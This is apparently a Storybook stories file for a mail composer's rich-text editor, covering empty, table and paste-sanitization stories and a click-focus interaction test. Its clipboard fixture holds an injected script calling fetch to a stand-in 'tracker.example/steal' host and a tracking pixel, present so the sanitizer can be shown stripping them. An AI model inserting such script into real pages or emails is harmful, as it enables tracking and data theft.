import type { Meta, StoryObj } from "@storybook/react";
import { expect, userEvent } from "storybook/test";
import { sanitizeAdoptedHtml } from "../lib/adopted-html.js";
import { RichTextEditor } from "./rich-text-editor.js";

/**
 * The frame is the compose body region at its real geometry — a column with a
 * height of its own — so the editor is shown claiming the space a composer
 * gives it rather than only the space its own text needs.
 */
const meta: Meta<typeof RichTextEditor> = {
	title: "Mail/RichTextEditor",
	component: RichTextEditor,
	parameters: { layout: "centered" },
	decorators: [
		(Story) => (
			<div
				data-testid="body-area"
				className="flex h-[420px] w-[640px] flex-col overflow-auto rounded-md border border-line bg-canvas"
			>
				<Story />
			</div>
		),
	],
};
export default meta;

type Story = StoryObj<typeof RichTextEditor>;

const RICH_DOCUMENT = [
	"<h2>Quarterly numbers</h2>",
	"<p>Highlights <strong>this quarter</strong>, with the detail below.</p>",
	"<ul><li>Revenue up 14%</li><li>Costs flat</li></ul>",
	"<table><thead><tr><th>Region</th><th>Total</th></tr></thead>",
	"<tbody><tr><td>EMEA</td><td>412</td></tr>",
	"<tr><td>Americas</td><td>388</td></tr></tbody></table>",
	'<p>Source: <a href="https://example.com/report">the full report</a>.</p>',
].join("");

/**
 * What a web page actually puts on the clipboard: presentation on every
 * element, a tracking pixel, a script, and Word's conditional markup.
 */
const CLIPBOARD_HTML = [
	'<meta charset="utf-8">',
	"<!--[if gte mso 9]><xml><w:WordDocument/></xml><![endif]-->",
	"<style>.hdr{color:#c00}</style>",
	'<h3 class="hdr" style="color:#c00;font-family:Verdana">Release checklist</h3>',
	'<ol><li style="margin:0">Cut the tag</li><li>Publish the images</li></ol>',
	'<table style="border:2px dashed #c00"><tbody>',
	"<tr><th>Step</th><th>Owner</th></tr>",
	"<tr><td>Tag</td><td>Ada</td></tr></tbody></table>",
	'<img src="http://tracker.example/px.gif" width="1" height="1">',
	'<script>fetch("https://tracker.example/steal")</script>',
].join("");

export const Empty: Story = {
	name: "Empty",
	args: {},
};

export const RichContent: Story = {
	name: "Rich content with a table",
	args: { initialHtml: RICH_DOCUMENT },
};

/**
 * The document after that clipboard has gone through the paste profile: the
 * heading, the list and the table survive; the styling, the pixel and the
 * script do not.
 */
export const PasteResult: Story = {
	name: "After pasting a web page",
	args: { initialHtml: sanitizeAdoptedHtml(CLIPBOARD_HTML) },
};

/**
 * A short message leaves most of the body region empty. That region belongs to
 * the document: the point far below the last line is the editable, and a click
 * there lands in it.
 */
export const ClickBelowTheText: Story = {
	name: "Clicking below the last line",
	args: { initialHtml: "<p>Sounds good. See you at 12:30.</p>" },
	play: async ({ canvasElement }) => {
		const area = canvasElement.querySelector<HTMLElement>(
			"[data-testid=body-area]",
		);
		const editable = canvasElement.querySelector<HTMLElement>(
			"[data-testid=compose-body]",
		);
		if (!area || !editable) throw new Error("the editor is not mounted");

		const box = area.getBoundingClientRect();
		const underTheText = document.elementFromPoint(
			box.left + box.width / 2,
			Math.min(box.bottom - 12, window.innerHeight - 2),
		);
		await expect(editable.contains(underTheText)).toBe(true);

		await userEvent.click(editable);
		await expect(editable).toHaveFocus();
	},
};
